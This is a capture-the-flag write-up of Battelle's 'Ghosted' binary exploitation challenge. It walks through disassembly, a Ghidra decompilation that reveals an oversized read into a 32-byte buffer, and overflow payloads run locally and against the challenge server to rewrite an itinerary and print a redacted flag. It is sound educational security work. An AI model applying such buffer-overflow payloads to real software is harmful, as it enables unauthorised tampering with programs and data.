Challenge Name: Ghosted

Category: Binary Exploitation Challenge

Date: 5/31/2025

Author: Ben Lehman

This is my writeup of the Ghosted ctf from battelle's challenges
https://www.battelle.org/the-challenge/ghosted

I started by looking at the file itself
```
[chiyo@bonkuraazu /mnt/c/Users/Chiyo/Desktop/Battelle/Ghosted]
$ file return_home
return_home: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=147dd54bee3d1f27eba222516acf7caf6bd814a8, not stripped
```
I am doing my reversing on a windows vm. so I had to set up wsl to continue.

I created a dump of the file in return_home.dump.txt using
```
objdump -D hello_world -M intel > return_home.dump.txt
```

I also got the strings with this command:
```
strings -t x return_home > return_home.strings.txt
```

These are the important looking strings:
```
   10d8 You're about to head home after a very satisfying holiday!
   1113 You're trying to schedule your itinerary but the airline's software seems... unhelpful... 
   116e Maybe you can hack your way home?
   1198 Welcome to Ghost Airlines!
   11b3 How would you like to proceed?
   11d2 		    [1] - View Itinerary
   11ed 		    [2] - Schedule Flight
   1209 		    [3] - Fly Home
   121e 		    [4] - Make a complaint
   123c ./flag
   1243 Here's your Itinerary!
   125a --Itinerary--
   1268 -------------
   1277 |%d. %s|
   1288 Scheduling flight...
   129d Enter the 3 letter airport code of your destination.
   12d8 Alright we'll get right on that...
   12fb input_buffer: %s
   1311 Oh sorry... Your flight was cancelled...
   1340 Hmmm looks like you messed that up pretty bad... Oh well, thanks for flying Spir.. err I mean Ghost Airlines!
   13b0 Oh boy here we go... Ok what's your complaint?
   13e0 Uh huh, ok... I'm going to file this away in our special complaint file...
   142b /dev/null/
   1438 ...First time on a computer, eh? Go ahead...Try again...
```

./flag seems like the thing that I want to get.
My next step is to see how I can find it.

There is a printflag function that uses that string that I was able to locate in the dump by searching for 123c which is the address of that string
```
0000000000000b7a <print_flag>:
     b7a:	55                   	push   rbp
     b7b:	48 89 e5             	mov    rbp,rsp
     b7e:	48 81 ec 20 01 00 00 	sub    rsp,0x120
     b85:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
     b8c:	00 00 
     b8e:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
     b92:	31 c0                	xor    eax,eax
     b94:	be 00 00 00 00       	mov    esi,0x0
     b99:	48 8d 3d 9c 06 00 00 	lea    rdi,[rip+0x69c]        # 123c <_IO_stdin_used+0x19c>
     ba0:	b8 00 00 00 00       	mov    eax,0x0
     ba5:	e8 86 fe ff ff       	call   a30 <open@plt>
     baa:	89 85 ec fe ff ff    	mov    DWORD PTR [rbp-0x114],eax
     bb0:	48 8d 85 f0 fe ff ff 	lea    rax,[rbp-0x110]
     bb7:	ba 00 01 00 00       	mov    edx,0x100
     bbc:	be 00 00 00 00       	mov    esi,0x0
     bc1:	48 89 c7             	mov    rdi,rax
     bc4:	e8 f7 fd ff ff       	call   9c0 <memset@plt>
     bc9:	48 8d 8d f0 fe ff ff 	lea    rcx,[rbp-0x110]
     bd0:	8b 85 ec fe ff ff    	mov    eax,DWORD PTR [rbp-0x114]
     bd6:	ba 00 01 00 00       	mov    edx,0x100
     bdb:	48 89 ce             	mov    rsi,rcx
     bde:	89 c7                	mov    edi,eax
     be0:	e8 fb fd ff ff       	call   9e0 <read@plt>
     be5:	48 8d 85 f0 fe ff ff 	lea    rax,[rbp-0x110]
     bec:	48 89 c7             	mov    rdi,rax
     bef:	e8 6c fd ff ff       	call   960 <puts@plt>
     bf4:	8b 85 ec fe ff ff    	mov    eax,DWORD PTR [rbp-0x114]
     bfa:	89 c7                	mov    edi,eax
     bfc:	e8 cf fd ff ff       	call   9d0 <close@plt>
     c01:	90                   	nop
     c02:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
     c06:	64 48 33 04 25 28 00 	xor    rax,QWORD PTR fs:0x28
     c0d:	00 00 
     c0f:	74 05                	je     c16 <print_flag+0x9c>
     c11:	e8 7a fd ff ff       	call   990 <__stack_chk_fail@plt>
     c16:	c9                   	leave
     c17:	c3                   	ret
```


This function is called in the fly home function
```
0000000000000de5 <fly_home>:
     de5:	55                   	push   rbp
     de6:	48 89 e5             	mov    rbp,rsp               //rsp is a parameter ot the function
     de9:	48 8b 05 20 12 20 00 	mov    rax,QWORD PTR [rip+0x201220]        # 202010 <itinerary>
     df0:	48 89 c7             	mov    rdi,rax
     df3:	e8 88 fb ff ff       	call   980 <strlen@plt>
     df8:	48 89 c6             	mov    rsi,rax
     dfb:	48 8b 05 0e 12 20 00 	mov    rax,QWORD PTR [rip+0x20120e]        # 202010 <itinerary>
     e02:	48 8b 15 2f 12 20 00 	mov    rdx,QWORD PTR [rip+0x20122f]        # 202038 <current_itinerary>
     e09:	48 8d 4a 04          	lea    rcx,[rdx+0x4]
     e0d:	48 89 f2             	mov    rdx,rsi
     e10:	48 89 c6             	mov    rsi,rax
     e13:	48 89 cf             	mov    rdi,rcx
     e16:	e8 d5 fb ff ff       	call   9f0 <memcmp@plt>
     e1b:	85 c0                	test   eax,eax
     e1d:	75 14                	jne    e33 <fly_home+0x4e> // de5 + 4e = e33
     e1f:	b8 00 00 00 00       	mov    eax,0x0
     e24:	e8 51 fd ff ff       	call   b7a <print_flag>
     e29:	bf 00 00 00 00       	mov    edi,0x0
     e2e:	e8 0d fc ff ff       	call   a40 <exit@plt>
     e33:	48 8d 3d 06 05 00 00 	lea    rdi,[rip+0x506]        # 1340 <_IO_stdin_used+0x2a0>
     e3a:	e8 21 fb ff ff       	call   960 <puts@plt>
     e3f:	bf 00 00 00 00       	mov    edi,0x0
     e44:	e8 f7 fb ff ff       	call   a40 <exit@plt>
```

Looking at this function decompiled in Ghidra:
```
void fly_home(void)

{
  int iVar1;
  size_t __n;
  
  __n = strlen(itinerary);
  iVar1 = memcmp((void *)(current_itinerary + 4),itinerary,__n);
  if (iVar1 == 0) {
    print_flag();
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts(
      "Hmmm looks like you messed that up pretty bad... Oh well, thanks for flying Spir.. err I mean  Ghost Airlines!"
      );
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

it compares current itinerary to itinerary and prints the flag if they are equal.
checking itinerary in ghidra I found this:
```
                             itinerary                                       XREF[3]:     Entry Point (*) , 
                                                                                          fly_home:00100de9 (R) , 
                                                                                          fly_home:00100dfb (R)   
        00302010 a8  10  10       addr       s_|1._MLB|_|2._TPA|_|3._CLT|_|4._I_001010a8      = "|1. MLB|\n|2. TPA|\n|3. CLT|\
                 00  00  00 
                 00  00

```

it is an address. Checking 10a8 in our strings (and the following addresses), I found these strings. This must be what our current_itinerary is supposed to look like:
```
10a8 |1. MLB|
10b1 |2. TPA|
10ba |3. CLT|
10c3 |4. IAD|
10cc |5. CMH|
```

Schedule flight seems like the next helpful place to check. this is the decompiled code from ghidra (I renamed variables based on my observation of their behavior)
```
void schedule_flight(void)

{
  long in_FS_OFFSET;
  int i;
  char newIteneraryItem [10];
  undefined1 inputBuffer [32];
  char valueAddedToItinerary [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  memset(valueAddedToItinerary,0,0x100);
  if (4 < (int)*current_itinerary) {
    *current_itinerary = 0;
  }
  puts("Scheduling flight...\nEnter the 3 letter airport code of your destination.");
  read(0,inputBuffer,0x30);
  snprintf(newIteneraryItem,10,"|%d. %s|\n",(ulong)*current_itinerary,inputBuffer);
  puts("Alright we\'ll get right on that...");
  printf("input_buffer: %s",inputBuffer);
  strncpy((char *)((long)current_itinerary + (long)(int)*current_itinerary * 9 + 4),
          valueAddedToItinerary,9);
  *current_itinerary = *current_itinerary + 1;
  for (i = 0; i < 3; i = i + 1) {
    puts(".");
    sleep(0);
  }
  puts("\nOh sorry... Your flight was cancelled...");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Here we see the vulnerability. 32 bytes are allocated for the input buffer, but read grabs 0x30 (or 48), which allows us to execute a buffer overflow attack. If we put in 32 bytes of junk data, and then put the 9 bytes that we need after that, that value will go into the next string, which will then be copied into the itinerary.
I created a python file that will give me the payloads that we need in payloadGenerator.py.
```
$ python3 payloadGenerator.py
Payload 1:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|1. MLB|

Payload 2:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|2. TPA|

Payload 3:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|3. CLT|

Payload 4:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|4. IAD|

Payload 5:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|5. CMH|
```

Now I can execute the attack.

```
[chiyo@bonkuraazu /mnt/c/Users/Chiyo/Desktop/Battelle/Ghosted] 
$ ./return_home
You're about to head home after a very satisfying holiday!
You're trying to schedule your itinerary but the airline's software seems... unhelpful... 
Maybe you can hack your way home?

Welcome to Ghost Airlines!
How would you like to proceed?
                    [1] - View Itinerary  
                    [2] - Schedule Flight 
                    [3] - Fly Home        
                    [4] - Make a complaint

2
Scheduling flight...
Enter the 3 letter airport code of your destination.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|1. MLB|
Alright we'll get right on that...
input_buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|1. MLB|
.
.
.

Oh sorry... Your flight was cancelled...
Welcome to Ghost Airlines!
How would you like to proceed?
                    [1] - View Itinerary
                    [2] - Schedule Flight
                    [3] - Fly Home
                    [4] - Make a complaint

2
Scheduling flight...
Enter the 3 letter airport code of your destination.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|2. TPA|
Alright we'll get right on that...
input_buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|2. TPA|
.
.
.

Oh sorry... Your flight was cancelled...
Welcome to Ghost Airlines!
How would you like to proceed?
                    [1] - View Itinerary
                    [2] - Schedule Flight
                    [3] - Fly Home
                    [4] - Make a complaint

2
Scheduling flight...
Enter the 3 letter airport code of your destination.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|3. CLT|
Alright we'll get right on that...
input_buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|3. CLT|
.
.
.

Oh sorry... Your flight was cancelled...
Welcome to Ghost Airlines!
How would you like to proceed?
                    [1] - View Itinerary
                    [2] - Schedule Flight
                    [3] - Fly Home
                    [4] - Make a complaint

2
Scheduling flight...
Enter the 3 letter airport code of your destination.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|4. IAD|
Alright we'll get right on that...
input_buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|4. IAD|
.
.
.

Oh sorry... Your flight was cancelled...
Welcome to Ghost Airlines!
How would you like to proceed?
                    [1] - View Itinerary
                    [2] - Schedule Flight
                    [3] - Fly Home
                    [4] - Make a complaint

2
Scheduling flight...
Enter the 3 letter airport code of your destination.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|5. CMH|
Alright we'll get right on that...
input_buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|5. CMH|
.
.
.

Oh sorry... Your flight was cancelled...
Welcome to Ghost Airlines!
How would you like to proceed?
                    [1] - View Itinerary
                    [2] - Schedule Flight
                    [3] - Fly Home
                    [4] - Make a complaint

3

[chiyo@bonkuraazu /mnt/c/Users/Chiyo/Desktop/Battelle/Ghosted]
```
It didn't output the failure message, meaning this works. Now I can try it on the server

```
[chiyo@bonkuraazu /mnt/c/Users/Chiyo/Desktop/Battelle/Ghosted]
$ nc ctf.battelle.org 30040
You're about to head home after a very satisfying holiday!
You're trying to schedule your itinerary but the airline's software seems... unhelpful...
Maybe you can hack your way home?

Welcome to Ghost Airlines!
How would you like to proceed?
                    [1] - View Itinerary
                    [2] - Schedule Flight
                    [3] - Fly Home
                    [4] - Make a complaint

2
Scheduling flight...
Enter the 3 letter airport code of your destination.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|1. MLB|
Alright we'll get right on that...
input_buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|1. MLB|
.
.
.

Oh sorry... Your flight was cancelled...
Welcome to Ghost Airlines!
How would you like to proceed?
                    [1] - View Itinerary
                    [2] - Schedule Flight
                    [3] - Fly Home
                    [4] - Make a complaint

2
Scheduling flight...
Enter the 3 letter airport code of your destination.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|2. TPA|
Alright we'll get right on that...
input_buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|2. TPA|
.
.
.

Oh sorry... Your flight was cancelled...
Welcome to Ghost Airlines!
How would you like to proceed?
                    [1] - View Itinerary
                    [2] - Schedule Flight
                    [3] - Fly Home
                    [4] - Make a complaint

2
Scheduling flight...
Enter the 3 letter airport code of your destination.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|3. CLT|
Alright we'll get right on that...
input_buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|3. CLT|
.
.
.

Oh sorry... Your flight was cancelled...
Welcome to Ghost Airlines!
How would you like to proceed?
                    [1] - View Itinerary
                    [2] - Schedule Flight
                    [3] - Fly Home
                    [4] - Make a complaint

2
Scheduling flight...
Enter the 3 letter airport code of your destination.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|4. IAD|
Alright we'll get right on that...
input_buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|4. IAD|
.
.
.

Oh sorry... Your flight was cancelled...
Welcome to Ghost Airlines!
How would you like to proceed?
                    [1] - View Itinerary
                    [2] - Schedule Flight
                    [3] - Fly Home
                    [4] - Make a complaint

2
Scheduling flight...
Enter the 3 letter airport code of your destination.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|5. CMH|
Alright we'll get right on that...
input_buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|5. CMH|
.
.
.

Oh sorry... Your flight was cancelled...
Welcome to Ghost Airlines!
How would you like to proceed?
                    [1] - View Itinerary
                    [2] - Schedule Flight
                    [3] - Fly Home
                    [4] - Make a complaint

3
flag{}
```

And there is our flag! I removed the contents to avoid spoilers if you wanted to try this challenge yourself.
